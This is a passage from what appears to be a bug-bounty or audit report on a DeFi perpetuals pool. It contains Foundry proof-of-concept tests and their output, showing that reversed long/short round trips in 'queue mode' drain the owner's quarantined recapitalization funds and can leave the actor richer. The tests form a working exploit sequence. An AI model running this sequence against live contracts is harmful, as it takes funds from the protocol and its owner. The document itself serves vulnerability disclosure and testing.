        uint256 buckets = pool.seniorPrincipal() + pool.juniorPrincipal() + pool.unassignedAssets()
            + pool.pendingRecapitalizationAssets() + pool.pendingTradingRevenueAssets();
        console2.log(step);
        console2.log("  S / J / U", pool.seniorPrincipal(), pool.juniorPrincipal(), pool.unassignedAssets());
        console2.log("  pRev / pRecap", pool.pendingTradingRevenueAssets(), pool.pendingRecapitalizationAssets());
        console2.log("  pool cash / buckets / treasury", cash, buckets, _accountValue(PROTOCOL_TREASURY_ACCOUNT));
    }

    // ------------------------------------------------------------------------------------------------------------
    // Reaching queue mode through trader PnL (as in the companion extraction PoC, but VICTIM_LP is independent)
    // ------------------------------------------------------------------------------------------------------------

    uint256 internal constant WIPE_SIZE = 45_000e18;
    uint256 internal constant WIPE_PRICE = 0.3e8; // LONG profits as the index falls

    function _reachQueueModeByTraderPnl() private {
        assertTrue(pool.isTradingActive(), "ghost: trading active");
        _publicDeposit(seniorVault, VICTIM_LP, VICTIM_SENIOR);
        _publicDeposit(juniorVault, LP_J, LP_J_JUNIOR);
        _ledgerLog("deposits done");

        // OWNER (documented trusted action): recapitalize a healthy pool; no senior gap => quarantined.
        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);
        _publicRedeemSettle(juniorVault, LP_J, juniorVault.balanceOf(LP_J) / 5);
        _ledgerLog("after owner recap + public settle");
        assertEq(pool.unassignedAssets(), RECAP, "ghost: over-recap quarantined as unassigned");

        // Independent trader W: long, the oracle price moves, W closes at a profit above LP principal.
        _fundTrader(TRADER_W, 20_000e6);
        _trade(TRADER_W, CfdTypes.Side.LONG, WIPE_SIZE, 10_000e6, false, REFRESHER);
        _price = WIPE_PRICE; // environment: the oracle price moves
        _trade(TRADER_W, CfdTypes.Side.LONG, WIPE_SIZE, 0, true, REFRESHER);
        _ledgerLog("after trader W closes at profit (pre-reconcile)");

        _publicRedeemSettle(juniorVault, LP_J, juniorVault.balanceOf(LP_J));
        _ledgerLog("after public reconcile (wipe)");
        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal(), 0, "ghost: both principals wiped by trader PnL");
        assertGt(pool.unassignedAssets(), 0, "ghost: owner quarantine survives the wipe");
        assertTrue(pool.canIncreaseRisk(), "ghost: router commit gate open");
        assertFalse(engine.degradedMode(), "ghost: not degraded");
        _price = 1e8; // environment: the price returns (no position is open, so this moves no value)
    }

    // ------------------------------------------------------------------------------------------------------------
    // PROPERTY: an unprivileged griefer with no LP shares cannot drain the owner's quarantine
    // ------------------------------------------------------------------------------------------------------------

    /// PROPERTY (should hold on a fixed contract): in queue mode, reversed round trips at a constant price by a party
    /// that holds NO LP shares move no value out of the owner's `unassignedAssets` quarantine, and the party cannot
    /// end richer. FAILS on the pinned code: the quarantine falls while the griefer only loses fees.
    function test_Property_GrieferCannotDrainQuarantine() public {
        _reachQueueModeByTraderPnl();
        _fundTrader(TRADER_A, TRADER_FUNDS);
        _fundTrader(TRADER_B, TRADER_FUNDS);

        uint256 quarantine0 = pool.unassignedAssets();
        uint256 grief0 = _grieferValue();
        uint256 victim0 = _victimLpValue();
        uint256 treasury0 = _accountValue(PROTOCOL_TREASURY_ACCOUNT);

        for (uint256 i; i < 5; ++i) {
            _cycle(35_000e18);
        }
        (uint256 sizeA,,,,,,) = engine.positions(TRADER_A);
        (uint256 sizeB,,,,,,) = engine.positions(TRADER_B);
        assertEq(sizeA + sizeB, 0, "ghost: all griefer positions closed");
        _ledgerLog("after 5 reversed cycles (pre-reconcile)");

        // Public reconcile: the independent senior LP redeems a fifth of its shares through the ordinary epoch path.
        // This settles the gross queue into senior principal and charges the shortfall to the quarantine.
        _publicRedeemSettle(seniorVault, VICTIM_LP, seniorVault.balanceOf(VICTIM_LP) / 5);
        _ledgerLog("after public reconcile (queue settled)");

        uint256 quarantine1 = pool.unassignedAssets();
        uint256 grief1 = _grieferValue();
        uint256 victim1 = _victimLpValue();
        uint256 treasury1 = _accountValue(PROTOCOL_TREASURY_ACCOUNT);

        int256 grieferNet = int256(grief1) - int256(grief0);
        int256 quarantineDrain = int256(quarantine0) - int256(quarantine1); // positive = damage
        int256 victimGain = int256(victim1) - int256(victim0);
        int256 treasuryGain = int256(treasury1) - int256(treasury0);

        console2.log("quarantine before / after", quarantine0, quarantine1);
        console2.log("griefer value before / after", grief0, grief1);
        console2.log("grieferNet (<0 = no profit)");
        console2.logInt(grieferNet);
        console2.log("quarantineDrain (>0 = damage to protocol)");
        console2.logInt(quarantineDrain);
        console2.log("victim senior LP gain / treasury gain");
        console2.logInt(victimGain);
        console2.logInt(treasuryGain);

        // The griefer has no profit: it only paid execution fees.
        assertLe(grieferNet, 0, "ghost: griefer profits nothing (no LP claim on the drained value)");

        // Value is conserved: the quarantine drain is matched by the gains of the independent senior LP and treasury,
        // plus the remaining senior principal held by the seed shares (pool.seniorPrincipal()). Nothing is created.
        // griefer loses |grieferNet|; quarantine loses quarantineDrain; those fund victim + treasury + residual senior.
        assertEq(
            settlementToken.balanceOf(address(pool)),
            pool.seniorPrincipal() + pool.juniorPrincipal() + pool.unassignedAssets()
                + pool.pendingRecapitalizationAssets() + pool.pendingTradingRevenueAssets(),
            "ledger identity after reconcile"
        );

        // THE BREAK: an unprivileged party, profiting nothing, moved the owner's recapitalization out of the
        // `unassignedAssets` quarantine. On a fixed contract the quarantine would not move for a both-sides round trip
        // at a constant price.
        assertEq(uint256(quarantineDrain), 0, "PROPERTY: griefer round trips drain the owner's quarantine");
    }

    /// CHARACTERIZE: more cycles drain more. The quarantine can be griefed toward empty with no profit to the actor.
    /// Shows the damage is unbounded in cycles (bounded only by the quarantine), while the griefer keeps losing fees.
    function test_Characterize_DrainGrowsWithCycles() public {
        _reachQueueModeByTraderPnl();
        _fundTrader(TRADER_A, TRADER_FUNDS);
        _fundTrader(TRADER_B, TRADER_FUNDS);

        uint256 quarantineStart = pool.unassignedAssets();
        uint256 grief0 = _grieferValue();

        for (uint256 i; i < 10; ++i) {
            _cycle(35_000e18);
        }
        _publicRedeemSettle(seniorVault, VICTIM_LP, seniorVault.balanceOf(VICTIM_LP) / 5);

        uint256 quarantineEnd = pool.unassignedAssets();
        int256 grieferNet = int256(_grieferValue()) - int256(grief0);
        console2.log("10-cycle quarantine before / after", quarantineStart, quarantineEnd);
        console2.log("10-cycle grieferNet (<0)");
        console2.logInt(grieferNet);
        assertLt(quarantineEnd, quarantineStart, "ghost: quarantine drained");
        assertLe(grieferNet, 0, "ghost: griefer still unprofitable");
    }

    /// CONTROL: in a NORMAL pool (principals > 0, no queue mode), the same reversed cycles move no quarantine (there is
    /// none) and leave the actor down by its fees. The griefing drain is specific to queue mode.
    function test_Control_NormalModeNoQuarantineDrain() public {
        _publicDeposit(juniorVault, address(0x5E1), RECAP);
        _publicDeposit(seniorVault, VICTIM_LP, VICTIM_SENIOR);
        _fundTrader(TRADER_A, TRADER_FUNDS);
        _fundTrader(TRADER_B, TRADER_FUNDS);

        uint256 quarantine0 = pool.unassignedAssets(); // 0 in a normal pool
        uint256 grief0 = _grieferValue();
        for (uint256 i; i < 5; ++i) {
            _cycle(35_000e18);
        }
        _publicRedeemSettle(seniorVault, VICTIM_LP, seniorVault.balanceOf(VICTIM_LP) / 5);
        int256 grieferNet = int256(_grieferValue()) - int256(grief0);
        console2.log("normal-mode quarantine (expect 0)", quarantine0, pool.unassignedAssets());
        console2.log("normal-mode grieferNet (<0)");
        console2.logInt(grieferNet);
        assertEq(pool.unassignedAssets(), quarantine0, "CONTROL: no quarantine to drain in normal mode");
        assertLe(grieferNet, 0, "CONTROL: round trips cost the griefer in normal mode");
    }
}
```

### Supporting PoC output (pinned code, unmodified contracts)

Same toolchain. Result: the control passes and the property test fails. Excerpt (same units; the actor `LP_X` holds 20k of the 21k senior supply and also controls both trading accounts and the keeper):

```console
[PASS] test_Control_NormalModeSameCyclesCostTheActor() (gas: 59326671)
Logs:
  -210804601

[FAIL: PROPERTY: actor (LP + traders + keeper) gains from round trips in queue mode: 335916694 > 0] test_Property_QueueModePumpViaTraderPnlWipe() (gas: 74346305)
Logs:
  ...
  after 5 reversed cycles (pre-reconcile)
    S / J / U 0 0 94578593549
    pRev / pRecap 647177822 0
    pool cash / buckets / treasury 94719036418 95225771371 158000000
    senior supply / LP_X senior shares 20999817321668 19999817321668
  after actor's public redeem settle
    S / J / U 30818259 0 94071858596
    pRev / pRecap 0 0
    pool cash / buckets / treasury 94102676855 94102676855 158000000
    senior supply / LP_X senior shares 1000000000000 0
  actor claimable redeem shares 19999817321668
  actor value before / after 80000000000 80335916694
  actor wallet USDC (LP_X) after 616359563
  actorNet / quarantineDelta / treasuryDelta / otherLpDelta
  335916694
  -506734953
  140000000
  0
  conservation residual (actor + dq + dt + dj) / remaining senior principal (seed shares)
  -30818259
  30818259

Suite result: FAILED. 1 passed; 1 failed; 0 skipped
```

### Supporting PoC test file: `packages/perps/test/perps/accounting/waterfall/Card9860S1QueueModeGrossRevenue.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// Queue mode: trading revenue is queued GROSS for the tranche claimants, while the rebates that reverse it are paid
// from pool cash that, in that state, is the owner's `unassignedAssets` quarantine.
// Pinned code: immunefi-team/audit-comp-plether @ a82d4fefb02768e5b3bddcc97dee371eee24fea8, unmodified contracts.
// Install path: packages/perps/test/perps/accounting/waterfall/ (next to HousePoolTerminalNav.t.sol, same fixture).
//
// Sequence (every step is a public entry point except the ONE labelled owner step):
//   1. LPs deposit through requestDeposit / settleLpEpoch / claimDeposit (actor LP_X: 20k senior; another LP: 5k junior).
//   2. OWNER (documented trusted action): CfdEngine.recapitalizePool(100k) while senior sits at its high-water mark, so
//      the whole amount is quarantined in `unassignedAssets` by the next public settleLpEpoch.
//   3. Wipe by TRADER PnL (no token burn): an independent trader opens a long through the router, the oracle price
//      moves (environment; MockPyth is the out-of-scope oracle mock), the trader closes at a profit larger than LP
//      principal. A public settleLpEpoch (triggered by an ordinary LP redeem request) reconciles both principals to
//      zero; the quarantine survives because it is reserved ahead of principal.
//   4. The actor, holding most of the wiped senior claim, trades both sides through the router with its own keeper
//      (queue mode: revenue queued gross at HousePool.sol:646, rebates paid from cash at HousePool.sol:604).
//   5. A public settleLpEpoch (the actor's own redeem request) settles the queue into senior principal and pays it out.
//
// Conservation identity checked: with no open position and the pool fully reconciled,
//   value(actor) + value(other LPs) + value(trader W) + treasury + unassigned(owner quarantine) is moved only by trader
//   PnL and fees; with the price constant during step 4, the actor's both-sides round trips are zero-sum against the LP
//   book, so the actor cannot end richer and the owner's quarantine cannot fall. Ledger identity also logged:
//   pool cash == principals + unassigned + pending buckets + trader claims (no positions open).

import {HousePoolAsyncTestBase} from "../../shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

contract Card9860S1QueueModeGrossRevenueTest is HousePoolAsyncTestBase {

    address internal constant LP_X = address(0xA77A); // actor LP account
    address internal constant TRADER_A = address(0xA11CE); // actor trading account 1
    address internal constant TRADER_B = address(0xB0B); // actor trading account 2
    address internal constant KEEPER = address(0x5EE5); // actor-run keeper, no role
    address internal constant LP_J = address(0x10B); // independent junior LP
    address internal constant TRADER_W = address(0x3A1); // independent trader whose PnL wipes the pool
    address internal constant REFRESHER = address(0x4EF4); // any EOA

    uint256 internal constant RECAP = 100_000e6;
    uint256 internal constant LP_X_SENIOR = 20_000e6;
    uint256 internal constant LP_J_JUNIOR = 5000e6;
    uint256 internal constant MARGIN = 10_000e6;
    uint256 internal constant TRADER_FUNDS = 40_000e6;

    uint256 internal _price = 1e8;
    uint256 private _nonce;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// Shipped v2.0.0 risk parameters (deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // ------------------------------------------------------------------------------------------------------------
    // Public entry points
    // ------------------------------------------------------------------------------------------------------------

    function _tickNow() private view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        uint256 nowTs = vm.getBlockTimestamp();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(_price)), 0, -8, nowTs, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _publicRefresh() private {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory data = _tickNow();
        vm.prank(REFRESHER);
        router.updateMarkPrice(data);
    }

    function _settleAt(
        uint256 epochId,
        address caller
    ) private {
        uint256 maturity = pool.lpEpochStart(epochId);
        if (vm.getBlockTimestamp() < maturity) {
            vm.warp(maturity);
        }
        vm.warp(vm.getBlockTimestamp() + 1);
        _publicRefresh();
        vm.prank(caller);
        pool.settleLpEpoch(0, 0);
    }

    function _publicDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) private {
        settlementToken.mint(lp, amount); // the LP's own USDC
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _settleAt(requestId, lp);
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimable, amount, "ghost: LP deposit finalized");
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    /// Public reconcile: an ordinary LP redeem request, matured, then permissionless settleLpEpoch(0,0).
    function _publicRedeemSettle(
        TrancheVault vault,
        address lp,
        uint256 shares
    ) private returns (uint256 requestId) {
        uint256 cooldownEnd = vault.lastDepositTime(lp) + vault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < cooldownEnd) {
            vm.warp(cooldownEnd); // the LP simply waits out its deposit cooldown
        }
        vm.prank(lp);
        requestId = vault.requestRedeem(shares, lp, lp);
        _settleAt(requestId, REFRESHER);
    }

    function _mockUniquePythUpdateDataAt(
        uint64 publishTime,
        uint64 previousPublishTime
    ) private returns (bytes[] memory updateData) {
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(_price)), 0, int32(-8), publishTime, previousPublishTime
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(_price);
    }

    function _commitV3(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) private returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("dogA", trader, ++_nonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        orderId = OrderRouter(address(router)).commitOrder(request);
    }

    function _keeperExecute(
        uint64 orderId,
        address keeper
    ) private {
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(orderId);
        uint64 committedAt = pending.commitTime;
        vm.warp(uint256(committedAt) + 2);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory data = _mockUniquePythUpdateDataAt(committedAt + 1, committedAt);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory res = router.executeOrder(orderId, data);
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Executed), "ghost: order executed by keeper");
    }

    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        address keeper
    ) private {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        _keeperExecute(_commitV3(trader, side, size, margin, isClose), keeper);
    }

    function _cycle(
        uint256 size
    ) private {
        _trade(TRADER_A, CfdTypes.Side.LONG, size, MARGIN, false, KEEPER);
        _trade(TRADER_B, CfdTypes.Side.SHORT, size, MARGIN, false, KEEPER);
        _trade(TRADER_B, CfdTypes.Side.SHORT, size, 0, true, KEEPER);
        _trade(TRADER_A, CfdTypes.Side.LONG, size, 0, true, KEEPER);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Value accounting
    // ------------------------------------------------------------------------------------------------------------

    function _accountValue(
        address who
    ) private view returns (uint256) {
        IMarginClearinghouse.AccountAssetBuckets memory b = clearinghouse.getAccountAssetBuckets(who);
        return settlementToken.balanceOf(who) + b.settlementBalanceAssets + engine.traderClaimBalanceAssets(who);
    }

    function _lpValue(
        TrancheVault vault,
        uint256 principal,
        address who
    ) private view returns (uint256) {
        uint256 supply = vault.totalSupply();
        return supply == 0 ? 0 : (vault.balanceOf(who) * principal) / supply;
    }

    /// Actor = LP_X (senior + junior shares, its wallet incl. redeemed cash and pending redeem escrow is excluded) +
    /// both trading accounts + its keeper.
    function _actorValue() private view returns (uint256) {
        return _accountValue(TRADER_A) + _accountValue(TRADER_B) + _accountValue(KEEPER)
            + settlementToken.balanceOf(LP_X) + _lpValue(seniorVault, pool.seniorPrincipal(), LP_X)
            + _lpValue(juniorVault, pool.juniorPrincipal(), LP_X);
    }

    function _ledgerLog(
        string memory step
    ) private view {
        uint256 cash = settlementToken.balanceOf(address(pool));
        uint256 buckets = pool.seniorPrincipal() + pool.juniorPrincipal() + pool.unassignedAssets()
            + pool.pendingRecapitalizationAssets() + pool.pendingTradingRevenueAssets();
        console2.log(step);
        console2.log("  S / J / U", pool.seniorPrincipal(), pool.juniorPrincipal(), pool.unassignedAssets());
        console2.log("  pRev / pRecap", pool.pendingTradingRevenueAssets(), pool.pendingRecapitalizationAssets());
        console2.log("  pool cash / buckets / treasury", cash, buckets, _accountValue(PROTOCOL_TREASURY_ACCOUNT));
        console2.log("  senior supply / LP_X senior shares", seniorVault.totalSupply(), seniorVault.balanceOf(LP_X));
    }

    // ------------------------------------------------------------------------------------------------------------
    // Reaching queue mode through trader PnL
    // ------------------------------------------------------------------------------------------------------------

    uint256 internal constant WIPE_SIZE = 45_000e18;
    uint256 internal constant WIPE_PRICE = 0.3e8; // LONG profits as the index falls

    function _reachQueueModeByTraderPnl() private {
        assertTrue(pool.isTradingActive(), "ghost: trading active");
        _publicDeposit(seniorVault, LP_X, LP_X_SENIOR);
        _publicDeposit(juniorVault, LP_J, LP_J_JUNIOR);
        _ledgerLog("deposits done");

        // OWNER (documented trusted action): recapitalize a healthy pool; no senior gap => quarantined.
        settlementToken.mint(address(this), RECAP);
        settlementToken.approve(address(engine), RECAP);
        engine.recapitalizePool(RECAP);
        // Public reconcile: LP_J redeems a fifth of its junior shares through the ordinary epoch path.
        _publicRedeemSettle(juniorVault, LP_J, juniorVault.balanceOf(LP_J) / 5);
        _ledgerLog("after owner recap + public settle");
        assertEq(pool.unassignedAssets(), RECAP, "ghost: over-recap quarantined as unassigned");

        // Independent trader W: long, the oracle price moves, W closes at a profit above LP principal.
        _fundTrader(TRADER_W, 20_000e6);
        _trade(TRADER_W, CfdTypes.Side.LONG, WIPE_SIZE, 10_000e6, false, REFRESHER);
        _price = WIPE_PRICE; // environment: the oracle price moves
        _trade(TRADER_W, CfdTypes.Side.LONG, WIPE_SIZE, 0, true, REFRESHER);
        _ledgerLog("after trader W closes at profit (pre-reconcile)");
        console2.log("trader W value", _accountValue(TRADER_W));

        // Public reconcile: LP_J asks to redeem its remaining junior shares (a full exit has no minimum size).
        _publicRedeemSettle(juniorVault, LP_J, juniorVault.balanceOf(LP_J));
        _ledgerLog("after public reconcile (wipe)");
        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal(), 0, "ghost: both principals wiped by trader PnL");
        assertGt(pool.unassignedAssets(), 0, "ghost: owner quarantine survives the wipe");
        assertTrue(pool.canIncreaseRisk(), "ghost: router commit gate open");
        assertFalse(engine.degradedMode(), "ghost: not degraded");
        _price = 1e8; // environment: the price returns (no position is open, so this moves no value)
    }

    struct Snap {
        uint256 actor;
        uint256 unassigned;
        uint256 treasury;
        uint256 lpJ;
    }

    function _snap() private view returns (Snap memory s) {
        s.actor = _actorValue();
        s.unassigned = pool.unassignedAssets();
        s.treasury = _accountValue(PROTOCOL_TREASURY_ACCOUNT);
        s.lpJ = settlementToken.balanceOf(LP_J) + _lpValue(juniorVault, pool.juniorPrincipal(), LP_J)
            + _lpValue(seniorVault, pool.seniorPrincipal(), LP_J);
    }

    /// PROPERTY: in queue mode, a party trading both sides at a constant price, then exiting through the public epoch
    /// path, cannot end richer, and the owner's quarantine is not consumed by those round trips.
    function test_Property_QueueModePumpViaTraderPnlWipe() public {
        _reachQueueModeByTraderPnl();
        _fundTrader(TRADER_A, TRADER_FUNDS);
        _fundTrader(TRADER_B, TRADER_FUNDS);
        Snap memory s0 = _snap();
        for (uint256 i; i < 5; ++i) {
            _cycle(35_000e18);
        }
        (uint256 sizeA,,,,,,) = engine.positions(TRADER_A);
        (uint256 sizeB,,,,,,) = engine.positions(TRADER_B);
        assertEq(sizeA + sizeB, 0, "ghost: all positions closed");
        _ledgerLog("after 5 reversed cycles (pre-reconcile)");

        // Actor exits: requests redeem of ALL its senior shares; the public settle reconciles (queue -> senior
        // principal) and funds the redemption in the same call.
        uint256 shares = seniorVault.balanceOf(LP_X);
        uint256 requestId = _publicRedeemSettle(seniorVault, LP_X, shares);
        _ledgerLog("after actor's public redeem settle");
        uint256 claimable = seniorVault.claimableRedeemRequest(requestId, LP_X);
        console2.log("actor claimable redeem shares", claimable);
        if (claimable > 0) {
            vm.prank(LP_X);
            seniorVault.claimRedeem(requestId, claimable, LP_X, LP_X);
        }
        Snap memory s1 = _snap();
        int256 actorNet = int256(s1.actor) - int256(s0.actor);
        int256 dq = int256(s1.unassigned) - int256(s0.unassigned);
        int256 dt = int256(s1.treasury) - int256(s0.treasury);
        int256 dj = int256(s1.lpJ) - int256(s0.lpJ);
        console2.log("actor value before / after", s0.actor, s1.actor);
        console2.log("actor wallet USDC (LP_X) after", settlementToken.balanceOf(LP_X));
        console2.log("actorNet / quarantineDelta / treasuryDelta / otherLpDelta");
        console2.logInt(actorNet);
        console2.logInt(dq);
        console2.logInt(dt);
        console2.logInt(dj);
        // Residual = the remaining senior principal owned by the senior seed shares (the only other senior holder).
        console2.log("conservation residual (actor + dq + dt + dj) / remaining senior principal (seed shares)");
        console2.logInt(actorNet + dq + dt + dj);
        console2.log(pool.seniorPrincipal());
        // Ledger identity after a full reconcile with no position open: pool cash == reserved buckets. It HOLDS (no
        // double count survives the reconcile); the break is attribution — owner quarantine re-assigned to the actor.
        assertEq(
            settlementToken.balanceOf(address(pool)),
            pool.seniorPrincipal() + pool.juniorPrincipal() + pool.unassignedAssets()
                + pool.pendingRecapitalizationAssets() + pool.pendingTradingRevenueAssets(),
            "ledger identity after full reconcile"
        );
        assertEq(actorNet + dq + dt + dj + int256(pool.seniorPrincipal()), 0, "value is conserved (a transfer)");
        assertLe(actorNet, 0, "PROPERTY: actor (LP + traders + keeper) gains from round trips in queue mode");
    }

    /// CONTROL: the identical cycles and exit in a normal pool cost the actor.
    function test_Control_NormalModeSameCyclesCostTheActor() public {
        _publicDeposit(juniorVault, LP_X, RECAP);
        _publicDeposit(seniorVault, address(0x5E1), 5000e6);
        _fundTrader(TRADER_A, TRADER_FUNDS);
        _fundTrader(TRADER_B, TRADER_FUNDS);
        Snap memory s0 = _snap();
        for (uint256 i; i < 5; ++i) {
            _cycle(35_000e18);
        }
        // Public reconcile triggered by the other LP's redeem request (the actor's shares stay in its wallet).
        _publicRedeemSettle(seniorVault, address(0x5E1), seniorVault.balanceOf(address(0x5E1)) / 5);
        Snap memory s1 = _snap();
        int256 actorNet = int256(s1.actor) - int256(s0.actor);
        console2.logInt(actorNet);
        assertLe(actorNet, 0, "CONTROL: round trips cost the actor in normal mode");
    }

}
```

